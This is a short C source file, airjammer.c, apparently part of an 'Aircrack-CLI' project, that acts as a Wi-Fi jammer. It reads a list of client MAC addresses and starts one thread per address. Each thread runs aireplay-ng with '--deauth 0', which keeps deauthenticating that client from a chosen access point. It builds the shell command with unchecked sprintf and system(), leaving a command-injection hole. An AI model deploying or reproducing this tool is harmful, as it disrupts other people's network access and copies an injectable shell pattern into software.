/**CFile***********************************************************************

  FileName    [airjammer.c]

  PackageName [Aircrack-CLI]

  Synopsis    [Aircrack Command Line Interface - AirJammer]

  Description [Command Line Interface for Aircrack-ng 
  (credits to Thomas d'Otreppe <tdotreppe@aircrack-ng.org>)]

  Author      [ynad]

  License     [GPLv2, see LICENSE.md]
  
  Revision    [beta-04, 2013-12-15]

******************************************************************************/


#ifndef __linux__
#error Compatible with Linux only!
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>

//Library functions header
#include "lib.h"

//Prototypes
void *jammer();

//error variable
//xextern int errno;

struct deainfo {
	maclist_t *maclst;
	char *bssid;
	char *mon;
};

struct deainfo *deathread;


int main (int argc, char *argv[])
{
	int i, dim, ris, *idx;
	maclist_t *maclst;
	pthread_t tid;

	if (argc < 4) {
		fprintf(stderr, "Argument error. Syntax:\n\t%s [BSSID] [MONITOR-IF] [MAC-LIST-FILE]\n", argv[0]);
		return (EXIT_FAILURE);
	}
	//check execution permissions
    if (getgid() != 0) {
        fprintf(stderr, "Run it as root!\n");
		return (EXIT_FAILURE);
    }
	dim = 0;
	//reading MACs list
	if ((maclst = freadMaclist(argv[3])) == NULL)
		return (EXIT_FAILURE);
	if ((dim = getDim(maclst)) == 0) {
		fprintf(stderr, "\nError: file empty o wrong content!\n");
		freeMem(maclst);
		return (EXIT_FAILURE);
	}
	//make data struct
	if ((deathread = (struct deainfo *)malloc(sizeof(struct deainfo))) == NULL) {
		fprintf(stderr, "\nError allocating struct: %s\n", strerror(errno));
		return (EXIT_FAILURE);
	}
	deathread->maclst = maclst;
	deathread->bssid = argv[1];
	deathread->mon = argv[2];
	if ((idx = (int *)malloc(dim * sizeof(int))) == NULL) {
		fprintf(stderr, "\nError allocating index: %s\n", strerror(errno));
		return (EXIT_FAILURE);
	}

	//creation of threads
	for (i=0; i<dim; i++) {
		idx[i] = i;
		ris = pthread_create(&tid, NULL, jammer, (void *) &idx[i]);
		if (ris) {
			fprintf(stderr, "Error creating thread %d (%d): %s\n", i, ris, strerror(errno));
			return (EXIT_FAILURE);
		}
	}
	pause();

    freeMem(maclst);
	free(deathread);
	free(idx);

	//return (EXIT_SUCCESS);
	pthread_exit(NULL);
}


void *jammer(void *idx)
{
	int i;
	char death[]={"aireplay-ng --deauth 0 -a"}, cmd[BUFF];

	i = *(int *)idx;

	sprintf(cmd, "%s %s -c %s %s --ignore-negative-one", death, deathread->bssid, getMac(deathread->maclst, i), deathread->mon);
	fprintf(stdout, "\tDeAuth n.%d:\n", i+1);
	setbuf(stdout, NULL);

	system(cmd);

	pthread_exit(NULL);
}

